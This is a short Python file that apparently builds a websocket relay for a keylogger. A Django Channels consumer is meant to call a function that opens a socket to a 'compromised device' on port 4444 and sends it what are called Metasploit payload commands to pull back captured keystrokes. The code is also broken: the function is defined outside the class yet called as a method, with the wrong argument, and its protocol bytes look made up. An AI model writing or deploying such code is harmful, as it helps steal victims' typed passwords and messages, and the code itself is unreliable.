import socket
import struct
import json
from channels.generic.websocket import AsyncWebsocketConsumer

class RPC_Socket(AsyncWebsocketConsumer):
    async def connect(self):
        await self.accept()

    async def disconnect(self, close_code):
        await self.close()

    async def receive(self, text_data):
        data = json.loads(text_data)

        await self.get_keystrokes(text_data=json.dumps({
                'result': 'return keystrokes data'
            }))
    

async def get_keystrokes(self, device_id):
    """
    Retrieve keystrokes from the compromised device using a Metasploit payload.
    """
    # Connect to the compromised device
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect(('compromised_device_ip', 4444))  # Replace with the actual IP and port of the compromised device

    # Send a request to the payload to retrieve keystrokes
    s.send(struct.pack('<I', 0x1234abcd))  # Magic number for the payload
    s.send(struct.pack('<I', 0x00000001))  # Command to retrieve keystrokes

    # Receive the keystrokes from the payload
    keystrokes = b''
    while True:
        data = s.recv(1024)
        if not data:
            break
        keystrokes += data

    # Close the connection
    s.close()

    return keystrokes.decode('utf-8')